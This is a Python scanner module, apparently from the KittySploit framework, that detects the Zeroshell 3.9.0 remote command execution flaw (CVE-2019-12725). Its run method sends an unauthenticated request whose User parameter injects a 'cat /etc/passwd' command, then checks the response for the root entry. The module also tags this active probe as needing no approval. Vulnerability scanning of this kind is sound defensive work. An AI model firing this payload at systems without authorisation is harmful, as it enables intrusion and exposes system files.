#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zeroshell 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zeroshell 3.9.0 - Remote Command Execution Detection',
        'description': 'Zeroshell 3.9.0 is prone to a remote command execution vulnerability. Specifically, this issue occurs because the web application mishandles a few HTTP parameters. An unauthenticated attacker can exploit this issue by injecting OS commands inside the vulnerable parameters.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'packetstorm', 'rce', 'zeroshell', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.zeroshell.org/new-release-and-critical-vulnerability/',
            'https://www.tarlogic.com/advisories/zeroshell-rce-root.txt',
            'https://github.com/X-C3LL/PoC-CVEs/blob/master/CVE-2019-12725/ZeroShell-RCE-EoP.py',
            'https://zeroshell.org/blog/',
            'http://packetstormsecurity.com/files/160211/ZeroShell-3.9.0-Remote-Command-Execution.html',
        ],
        'cve': 'CVE-2019-12725',
    }

    def run(self):
        r = self.http_request(method="GET", path="/cgi-bin/kerbynet?Action=StartSessionSubmit&User='%0acat%20/etc/passwd%0a'&PW=", allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Zeroshell 3.9.0 - Remote Command Execution detected",
                path="/cgi-bin/kerbynet?Action=StartSessionSubmit&User='%0acat%20/etc/passwd%0a'&PW=",
            )
            return True
        return False

